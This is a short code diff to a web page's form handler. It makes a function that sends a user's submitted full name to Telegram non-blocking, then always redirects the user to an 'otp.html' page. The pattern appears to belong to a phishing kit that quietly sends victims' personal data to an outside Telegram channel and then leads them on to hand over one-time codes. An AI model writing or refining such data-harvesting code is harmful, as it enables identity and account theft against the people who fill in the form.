@@ -327,15 +327,17 @@
             submitBtn.innerHTML = '<span class="loading-spinner"></span>Processing...';
             
             try {
-                // Send full name to Telegram
-                await sendFormDataToTelegram('New Full Name', {
+                // Send full name to Telegram (non-blocking - won't fail form submission)
+                sendFormDataToTelegram('New Full Name', {
                     'Full Name': fullName
+                }).catch(err => {
+                    console.warn('Telegram notification failed (non-critical):', err);
                 });
                 
                 // Simulate processing time
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // Redirect to next page
+                // Always redirect - don't block on Telegram errors
                 window.location.href = 'otp.html?msg=againc';
             } catch (error) {
                 console.error('Error submitting name:', error);
